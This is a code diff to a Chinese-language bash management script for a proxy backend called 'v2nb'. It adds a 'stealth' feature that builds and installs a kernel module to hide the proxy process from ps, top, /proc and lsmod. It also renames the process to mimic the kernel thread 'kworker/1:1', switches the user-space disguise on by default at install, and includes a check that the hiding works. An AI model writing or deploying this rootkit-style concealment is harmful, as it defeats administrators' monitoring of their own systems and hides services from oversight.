@@ -76,6 +76,194 @@ elif [[ x"${release}" == x"debian" ]]; then
     fi
 fi
 
+########################
+# 进程隐藏（stealth）辅助
+########################
+STEALTH_DIR="/etc/v2nb/stealth"
+STEALTH_KO="/etc/v2nb/v2hide.ko"
+STEALTH_ALIAS="kworker/1:1"
+
+# 编译内核模块（需要目标机内核 headers）
+build_stealth_module() {
+    local work_dir="$1"
+    if [[ ! -f "$work_dir/v2hide.c" ]]; then
+        return 1
+    fi
+    if [[ ! -d "/lib/modules/$(uname -r)/build" ]]; then
+        return 1
+    fi
+    ( cd "$work_dir" && make >/dev/null 2>&1 )
+    if [[ -f "$work_dir/v2hide.ko" ]]; then
+        install -m 600 "$work_dir/v2hide.ko" "$STEALTH_KO"
+        return 0
+    fi
+    return 1
+}
+
+# 打开 /etc/v2nb/config.json 里的 Stealth 段（python3 合并 JSON，不破坏已有配置）
+enable_stealth_config() {
+    local cfg="/etc/v2nb/config.json"
+    local kernel_flag="$1"
+    local module_path="$2"
+    [[ -f "$cfg" ]] || return 1
+    if ! command -v python3 >/dev/null 2>&1; then
+        return 1
+    fi
+    python3 - "$cfg" "$STEALTH_ALIAS" "$kernel_flag" "$module_path" <<'PYEOF'
+import json, sys
+path, alias, kernel, module = sys.argv[1], sys.argv[2], sys.argv[3] == "true", sys.argv[4]
+with open(path, "r", encoding="utf-8") as f:
+    data = json.load(f)
+data["Stealth"] = {
+    "Enable": True,
+    "Alias": alias,
+    "Kernel": kernel,
+    "KernelModule": module,
+    "HideEnv": True,
+    "HideModule": True,
+    "ShredExe": False,
+    "Debug": False,
+}
+with open(path, "w", encoding="utf-8") as f:
+    json.dump(data, f, ensure_ascii=False, indent=4)
+    f.write("\n")
+PYEOF
+    return $?
+}
+
+# 安装阶段自动开启隐藏：用户态伪装始终开启；内核模块能编译就一起上
+setup_stealth_auto() {
+    local work_dir="/usr/local/v2nb/stealth-src"
+    local kernel_flag="false"
+
+    if build_stealth_module "$work_dir"; then
+        kernel_flag="true"
+        echo -e "${green}内核隐藏模块已编译并安装到 ${STEALTH_KO}${plain}"
+    else
+        echo -e "${yellow}未编译内核模块（缺内核 headers 或编译失败），本次仅启用用户态伪装${plain}"
+        echo -e "${yellow}如需彻底从 ps 消失，装好内核 headers 后执行: v2nb stealth install${plain}"
+    fi
+
+    if enable_stealth_config "$kernel_flag" "$STEALTH_KO"; then
+        echo -e "${green}已在 /etc/v2nb/config.json 中开启 Stealth 隐藏${plain}"
+    else
+        echo -e "${yellow}自动写入 Stealth 配置失败（缺 python3 或配置不存在），可执行 v2nb stealth enable${plain}"
+    fi
+}
+
+stealth_status() {
+    local cfg="/etc/v2nb/config.json"
+    local pid
+    echo "-------------------------"
+    if [[ -f "$cfg" ]] && grep -q '"Stealth"' "$cfg" 2>/dev/null; then
+        echo -e "配置开关: ${green}已开启${plain}"
+        grep -A3 '"Stealth"' "$cfg" | sed 's/^/    /'
+    else
+        echo -e "配置开关: ${red}未开启${plain}"
+    fi
+    if [[ -f "$STEALTH_KO" ]]; then
+        echo -e "内核模块: ${green}${STEALTH_KO} 已就位${plain}"
+    else
+        echo -e "内核模块: ${yellow}未安装${plain}"
+    fi
+    if lsmod 2>/dev/null | grep -q '^v2hide'; then
+        echo -e "模块状态: ${green}已加载${plain}"
+    else
+        echo -e "模块状态: ${yellow}未加载${plain}"
+    fi
+    if [[ -f /usr/local/v2nb/v2nb ]]; then
+        pid=$(pgrep -f '/usr/local/v2nb/v2nb server' | head -n1)
+        if [[ -n "$pid" ]]; then
+            echo "进程视角自检 (pid=$pid):"
+            echo "    comm     = $(cat /proc/$pid/comm 2>/dev/null)"
+            echo "    cmdline  = $(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)"
+            echo "    environ  = $(tr '\0' ' ' < /proc/$pid/environ 2>/dev/null | head -c 80)"
+        fi
+    fi
+    echo "-------------------------"
+}
+
+stealth_install_module() {
+    local work_dir="/usr/local/v2nb/stealth-src"
+    if build_stealth_module "$work_dir"; then
+        echo -e "${green}内核模块已编译安装到 ${STEALTH_KO}${plain}"
+        enable_stealth_config "true" "$STEALTH_KO" && echo -e "${green}已开启内核级隐藏，请执行 v2nb restart${plain}"
+    else
+        echo -e "${red}编译失败：请先安装内核 headers（apt install linux-headers-$(uname -r) / dnf install kernel-devel）${plain}"
+    fi
+}
+
+stealth_disable() {
+    local cfg="/etc/v2nb/config.json"
+    if [[ -f "$cfg" ]] && command -v python3 >/dev/null 2>&1; then
+        python3 - "$cfg" <<'PYEOF'
+import json, sys
+path = sys.argv[1]
+with open(path, "r", encoding="utf-8") as f:
+    data = json.load(f)
+data.pop("Stealth", None)
+with open(path, "w", encoding="utf-8") as f:
+    json.dump(data, f, ensure_ascii=False, indent=4)
+    f.write("\n")
+PYEOF
+        echo -e "${green}已关闭隐藏配置，重启 v2nb 生效${plain}"
+    else
+        echo -e "${red}关闭失败：配置文件不存在或缺 python3${plain}"
+    fi
+}
+
+stealth_verify() {
+    local pid pass=0 fail=0
+    pid=$(pgrep -f '/usr/local/v2nb/v2nb server' | head -n1)
+    if [[ -z "$pid" ]]; then
+        echo -e "${red}未找到运行中的 v2nb 进程${plain}"
+        return
+    fi
+    echo "目标 pid = $pid"
+    _check() {
+        local out
+        out=$(eval "$2" 2>/dev/null)
+        if [[ -z "$out" ]]; then
+            echo -e "${green}[v]${plain} $1 -> 不可见"; pass=$((pass+1))
+        else
+            echo -e "${red}[x]${plain} $1 -> 仍可见: $out"; fail=$((fail+1))
+        fi
+    }
+    _check "ps -ef"            "ps -ef | awk -v p=$pid '\$2==p'"
+    _check "ps -eo pid,comm"   "ps -eo pid,comm | awk -v p=$pid '\$1==p'"
+    _check "ls /proc"          "ls /proc | grep -x $pid"
+    _check "top -bn1"          "top -bn1 2>/dev/null | awk -v p=$pid '\$1==p'"
+    _check "lsmod 里的 v2hide" "lsmod | awk '\$1==\"v2hide\"'"
+    echo "通过 $pass 项，失败 $fail 项"
+    if [[ $fail -eq 0 ]]; then
+        echo -e "${green}隐藏生效${plain}"
+    else
+        echo -e "${yellow}部分枚举仍能看到目标，检查模块是否加载: dmesg | tail${plain}"
+    fi
+}
+
+stealth_usage() {
+    echo "v2nb stealth 使用方法: "
+    echo "------------------------------------------"
+    echo "v2nb stealth status   - 查看隐藏状态与进程自检"
+    echo "v2nb stealth enable   - 开启隐藏（用户态伪装）"
+    echo "v2nb stealth install  - 编译并启用内核级隐藏（需内核 headers）"
+    echo "v2nb stealth verify   - 验证隐藏效果"
+    echo "v2nb stealth disable  - 关闭隐藏"
+    echo "------------------------------------------"
+}
+
+stealth_cmd() {
+    case "$1" in
+        "status") stealth_status ;;
+        "enable") enable_stealth_config "false" "$STEALTH_KO" && echo -e "${green}已开启用户态隐藏，请执行 v2nb restart${plain}" ;;
+        "install") stealth_install_module ;;
+        "verify") stealth_verify ;;
+        "disable") stealth_disable ;;
+        *) stealth_usage ;;
+    esac
+}
+
 confirm() {
     if [[ $# > 1 ]]; then
         echo && read -rp "$1 [默认$2]: " temp
@@ -507,9 +695,31 @@ show_usage() {
     echo "v2nb install      - 安装 v2nb"
     echo "v2nb uninstall    - 卸载 v2nb"
     echo "v2nb version      - 查看 v2nb 版本"
+    echo "v2nb stealth      - 进程隐藏管理（status/enable/install/verify/disable）"
     echo "------------------------------------------"
 }
 
+stealth_menu() {
+    echo -e "
+  ${green}进程隐藏管理${plain}
+  ${green}1.${plain} 查看隐藏状态
+  ${green}2.${plain} 开启隐藏（用户态伪装）
+  ${green}3.${plain} 启用内核级隐藏（编译模块，需内核 headers）
+  ${green}4.${plain} 验证隐藏效果
+  ${green}5.${plain} 关闭隐藏
+  ${green}6.${plain} 返回主菜单
+ "
+    echo && read -rp "请输入选择 [1-6]: " snum
+    case "${snum}" in
+        1) stealth_status; before_show_menu ;;
+        2) stealth_cmd enable; before_show_menu ;;
+        3) stealth_cmd install; before_show_menu ;;
+        4) stealth_cmd verify; before_show_menu ;;
+        5) stealth_cmd disable; before_show_menu ;;
+        6) show_menu ;;
+        *) echo -e "${red}请输入正确的数字 [1-6]${plain}"; before_show_menu ;;
+    esac
+}
 show_menu() {
     echo -e "
   ${green}v2nb 后端管理脚本，${plain}${red}不适用于docker${plain}
@@ -533,11 +743,12 @@ show_menu() {
   ${green}12.${plain} 升级 v2nb 维护脚本
   ${green}13.${plain} 生成 v2nb 配置文件
   ${green}14.${plain} 放行 VPS 的所有网络端口
-  ${green}15.${plain} 退出脚本
+  ${green}15.${plain} 进程隐藏管理
+  ${green}16.${plain} 退出脚本
  "
  #后续更新可加入上方字符串中
     show_status
-    echo && read -rp "请输入选择 [0-15]: " num
+    echo && read -rp "请输入选择 [0-16]: " num
 
     case "${num}" in
         0) config ;;
@@ -555,8 +766,9 @@ show_menu() {
         12) update_shell ;;
         13) generate_config_file ;;
         14) open_ports ;;
-        15) exit ;;
-        *) echo -e "${red}请输入正确的数字 [0-15]${plain}" ;;
+        15) stealth_menu ;;
+        16) exit ;;
+        *) echo -e "${red}请输入正确的数字 [0-16]${plain}" ;;
     esac
 }
 
@@ -576,6 +788,7 @@ if [[ $# > 0 ]]; then
         "install") check_uninstall 0 && install 0 ;;
         "uninstall") check_install 0 && uninstall 0 ;;
         "version") check_install 0 && show_v2nb_version 0 ;;
+        "stealth") stealth_cmd "$2" ;;
         "update_shell") update_shell ;;
         *) show_usage
     esac
